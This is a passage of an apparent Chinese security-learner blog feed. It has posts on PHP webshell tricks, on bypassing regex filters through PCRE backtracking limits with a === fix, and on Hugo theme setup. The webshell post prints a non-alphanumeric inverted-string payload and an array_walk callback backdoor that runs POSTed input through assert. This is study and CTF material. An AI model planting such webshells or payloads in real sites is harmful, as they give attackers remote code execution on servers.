&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pass it!&lt;/p&gt;
&lt;p&gt;PHP7前是不允许用&lt;code&gt;($a)();&lt;/code&gt;这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过&lt;code&gt;(&#39;phpinfo&#39;)();&lt;/code&gt;来执行函数，第一个括号中可以是任意PHP表达式。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a3bb22ab3f51d91c05a77.png#alt=&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a3bb22ab3f51d91c05a77.png#alt=&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后,利用之前的取反,得到答案(phpinfo)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(~%8F%97%8F%96%91%99%90)();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(上面url表示的都是abcd&amp;hellip;之外的不可见字符)&lt;/p&gt;
&lt;h2 id=&#34;回调函数&#34;&gt;回调函数&lt;/h2&gt;
&lt;p&gt;回调函数的运用在一段时间里曾被webshell广泛应用。&lt;/p&gt;
&lt;p&gt;首先，我们需要知道什么是回调函数，回调是什么意思？&lt;/p&gt;
&lt;p&gt;所谓是回调其实就是间接调用，当PHP调用用户自定义的函数时，必须要通过一个代理函数来进行调用，所以称为回调函数。&lt;/p&gt;
&lt;h4 id=&#34;array_walk&#34;&gt;array_walk()&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;array_walk(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;,myfunction,parameter&lt;span style=&#34;color:#ff79c6&#34;&gt;...&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;参数&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;em&gt;array&lt;/em&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;必需。规定数组。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;em&gt;myfunction&lt;/em&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;必需。用户自定义函数的名称。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;em&gt;userdata&lt;/em&gt;,…&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;Ameng&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$key&lt;/span&gt;){   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$a&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$key&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;;	&lt;span style=&#34;color:#6272a4&#34;&gt;//拼接
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$a&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;ass&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;ert&amp;#34;&lt;/span&gt;);	&lt;span style=&#34;color:#6272a4&#34;&gt;//$value=ert,$key=ass
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    array_walk(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$b&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Ameng&amp;#34;&lt;/span&gt;);	&lt;span style=&#34;color:#6272a4&#34;&gt;//调用自己定义函数，并传入键值对
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参考:&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;一些不包含数字和字母的webshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;无字母数字webshell之提高篇&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.icode9.com/content-3-827439.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;php webshell各种姿势总结 - ICode9&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>正则与PCRE回溯</title>
        <link>https://proben1.github.io/2022/%E6%AD%A3%E5%88%99%E4%B8%8Epcre%E5%9B%9E%E6%BA%AF/</link>
        <pubDate>Thu, 12 May 2022 20:53:02 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E6%AD%A3%E5%88%99%E4%B8%8Epcre%E5%9B%9E%E6%BA%AF/</guid>
        <description>&lt;p&gt;正则表达式&lt;/p&gt;
&lt;p&gt;PHP利用PCRE回溯次数限制绕过&lt;/p&gt;
&lt;h2 id=&#34;起源&#34;&gt;起源&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;20世纪40年代&lt;/strong&gt;：正则表达式最初的想法来自两位神经学家：沃尔特·皮茨与麦卡洛克，他们研究出了一种用数学方式来描述&lt;strong&gt;神经网络&lt;/strong&gt;的模型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1956年&lt;/strong&gt;：一位名叫Stephen Kleene的数学科学家发表了一篇题目是《神经网事件的表示法》的论文，利用称之为&lt;strong&gt;正则集合的数学符号来描述此模型&lt;/strong&gt;，引入了正则表达式的概念。正则表达式被作为用来描述其称之为“正则集的代数”的一种表达式，因而采用了“&lt;strong&gt;正则表达式&lt;/strong&gt;”这个术语。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1968年&lt;/strong&gt;：C语言之父、UNIX之父&lt;strong&gt;肯·汤普森&lt;/strong&gt;把这个“正则表达式”的理论成果用于做一些搜索算法的研究，他描述了一种正则表达式的编译器，于是出现了应该算是最早的正则表达式的编译器qed（这也就成为后来的grep编辑器）。&lt;/p&gt;
&lt;p&gt;Unix使用正则之后，正则表达式不断的发展壮大，然后大规模应用于各种领域，根据这些领域各自的条件需要，又发展出了许多版本的正则表达式，出现了许多的分支。我们把这些分支叫做“&lt;strong&gt;流派&lt;/strong&gt;”。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1987年&lt;/strong&gt;：Perl语言诞生了，它综合了其他的语言，用正则表达式作为基础，开创了一个新的流派，&lt;strong&gt;Perl流派&lt;/strong&gt;。之后很多编程语言如：&lt;strong&gt;Python、Java、Ruby、.Net、PHP等等在设计正则式支持的时候都参考Perl正则表达式&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;到这里我们也就知道&lt;strong&gt;为什么众多编程语言的正则表达式基本一样，因为他们都师从Perl&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://deerchao.cn/tutorials/regex/regex.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;正则表达式30分钟入门教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a28c32ab3f51d91b1002a.png#id=hMpDc&amp;amp;originHeight=732&amp;amp;originWidth=454&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a28c32ab3f51d91b1002a.png#id=hMpDc&amp;amp;originHeight=732&amp;amp;originWidth=454&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;匹配原理&#34;&gt;匹配原理&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;执行过程&lt;/strong&gt;:由正则表达引擎编译执行,可以有预编译&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a28d02ab3f51d91b10a35.png#id=X18mt&amp;amp;originHeight=732&amp;amp;originWidth=720&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a28d02ab3f51d91b10a35.png#id=X18mt&amp;amp;originHeight=732&amp;amp;originWidth=720&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;引擎&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DFA (Deterministic finite automaton) 确定型有穷自动机&lt;/li&gt;
&lt;li&gt;NFA (Non-deterministic finite automaton) 非确定型有穷自动机&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;解释下确定型、有穷、自动机这几个名词：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;确定型与非确定型&lt;/strong&gt;：假设有一个字符串（text=abc）需要匹配，在没有编写正则表达式的前提下，就直接&lt;strong&gt;可以确定字符匹配顺序的就是确定型&lt;/strong&gt;，不能确定字符匹配顺序的则为非确定型。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;有穷&lt;/strong&gt;：有穷即表示有限的意思，这里表示有限次数内能得到结果。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自动机&lt;/strong&gt;：自动机便是自动完成，在我们设置好匹配规则后由引擎自动完成，不需要人为干预！&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;DFA文本主导,按照文本的顺序执行&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a2a852ab3f51d91b26262.gif&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a2a852ab3f51d91b26262.gif&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;NFA表达式主导,按照表达式的一部分执行，如果不匹配换其他部分继续匹配，直到表达式匹配完成。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/627d06990947543129e1366b.gif&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/627d06990947543129e1366b.gif&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;绝大多数编程语言都选择NFA引擎,因为更灵活些.&lt;/p&gt;
&lt;p&gt;当某个正则分支匹配不成功之后，文本的位置需要回退，然后换另一个分支匹配，&lt;strong&gt;而回退这步专业术语就叫：回溯&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a29352ab3f51d91b15b99.png#id=pktqx&amp;amp;originHeight=485&amp;amp;originWidth=732&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a29352ab3f51d91b15b99.png#id=pktqx&amp;amp;originHeight=485&amp;amp;originWidth=732&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回溯陷阱&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;举个例子：text=aaaaa，pattern=/^(a*)b$/，匹配过程大致是&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;(a*)：匹配到了文本中的aaaaa&lt;/li&gt;
&lt;li&gt;匹配正则中的b，但是失败，因为(a*)已经把text都吃了&lt;/li&gt;
&lt;li&gt;这时候引擎会要求(a*)吐出最后一个字符(a)，但是无法匹配b&lt;/li&gt;
&lt;li&gt;第二次是吐出倒数第二个字符(还是a)，依然无法匹配&lt;/li&gt;
&lt;li&gt;就这样引擎会要求(a*)逐个将吃进去的字符都吐出来&lt;/li&gt;
&lt;li&gt;但是到最后都无法匹配b&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;引擎会要求&lt;code&gt;*&lt;/code&gt;匹配的东西一点一点吐回，我们假设如果文本长度为几万，那引擎就要回溯几万次，这对机器的CPU来说简直是灾难。&lt;/p&gt;
&lt;p&gt;这就是回溯陷阱&lt;/p&gt;
&lt;p&gt;附:&lt;a class=&#34;link&#34; href=&#34;https://c.runoob.com/front-end/854/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;常用正则表达式&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;pcrebacktrack_limit&#34;&gt;pcre.backtrack_limit&lt;/h2&gt;
&lt;p&gt;PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限&lt;code&gt;pcre.backtrack_limit&lt;/code&gt;。我们可以通过&lt;code&gt;var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));&lt;/code&gt;的方式查看当前环境下的上限&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/617a2b102ab3f51d91b2ce5a.jpg#id=xoK7z&amp;amp;originHeight=66&amp;amp;originWidth=498&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/617a2b102ab3f51d91b2ce5a.jpg#id=xoK7z&amp;amp;originHeight=66&amp;amp;originWidth=498&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;status=done&amp;amp;style=none&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万,那么&lt;code&gt;preg_match&lt;/code&gt;返回的不是1和0，而是false。&lt;/p&gt;
&lt;p&gt;eg:放进xunt里面了,题目名PCRE&lt;/p&gt;
&lt;h2 id=&#34;修复方法&#34;&gt;修复方法&lt;/h2&gt;
&lt;p&gt;如果用&lt;code&gt;preg_match&lt;/code&gt;对字符串进行匹配，一定要使用&lt;code&gt;===&lt;/code&gt;全等号来判断返回值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;is_php&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$data&lt;/span&gt;){  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;lt;\?.*[(`;?&amp;gt;].*/is&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$data&lt;/span&gt;);  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(is_php(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$input&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;// fwrite($f, $input); ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000021787021&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;正则表达式引擎执行原理&lt;/a&gt;（猪哥）&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;P神&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Stack修改</title>
        <link>https://proben1.github.io/2022/stack%E4%BF%AE%E6%94%B9/</link>
        <pubDate>Thu, 12 May 2022 11:23:22 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/stack%E4%BF%AE%E6%94%B9/</guid>
        <description>&lt;h3 id=&#34;使用主题&#34;&gt;使用主题&lt;/h3&gt;
&lt;p&gt;我选了一个stack的魔改的主题，感谢作者！（已给星星）&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Mantyke/Hugo-stack-theme-mod&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Mantyke/Hugo-stack-theme-mod&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下载下来直接和github连接并使用即可，这里的hugo版本是hugo v0.89.2-63E3A5EB+extended&lt;/p&gt;
&lt;h3 id=&#34;基础配置&#34;&gt;基础配置&lt;/h3&gt;
&lt;p&gt;对根目录的config.yaml进行配置：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;baseurl: https://proben1.github.io/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;title: 茄子的养殖场
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;emoji: 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 推荐一个emoji查询的网站：https://www.emojiall.com/zh-hans
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 如果难看可以注释掉emoji
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;subtitle: 完成一个名为大学的作品
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;网站图标&#34;&gt;网站图标&lt;/h3&gt;
&lt;p&gt;根目录下新建static文件夹，把中意图标的ioc拖进去，命名favicon.ico&lt;/p&gt;
&lt;h3 id=&#34;头像&#34;&gt;头像&lt;/h3&gt;
&lt;p&gt;修改img/avatar.png&lt;/p&gt;
&lt;h3 id=&#34;短代码&#34;&gt;短代码&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://guanqr.com/tech/website/hugo-shortcodes-customization/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;选自这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;直接效果演示吧：&lt;/p&gt;


&lt;p style=&#34;text-align:left&#34;&gt;文字居左&lt;/p&gt;



&lt;p style=&#34;text-align:center&#34;&gt;文字居中&lt;/p&gt;



&lt;p style=&#34;text-align:right&#34;&gt;文字居右&lt;/p&gt;




&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;notice-warning&lt;/p&gt;&lt;/div&gt;




&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;notice-info&lt;/p&gt;&lt;/div&gt;




&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;notice-note&lt;/p&gt;&lt;/div&gt;




&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;notice-tip&lt;/p&gt;&lt;/div&gt;



&lt;blockquote class=&#34;quote en&#34;&gt;
        &lt;p&gt;To see a world in a grain of sand. And a heaven in a wild flower. Hold infinity in the palm of your hand. And eternity in an hour.&lt;/p&gt;&lt;/blockquote&gt; 
&lt;h3 id=&#34;修改行内代码样式&#34;&gt;修改「行内代码」样式&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.echosec.top/p/custom-hugo-theme-styles/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;摘自这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;效果&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改键盘标签样式&#34;&gt;修改「键盘标签」样式&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.echosec.top/p/custom-hugo-theme-styles/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;摘自这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;kbd&gt;Ctrl&lt;/kbd&gt;&lt;/p&gt;
&lt;h3 id=&#34;添加友链&#34;&gt;添加友链&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.echosec.top/p/custom-hugo-theme-styles/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;同样是摘自这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在~\data\links.json里添加友链就可以了;image放在~\assets\link-img\里&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;小球飞鱼&amp;#34;&lt;/span&gt;,
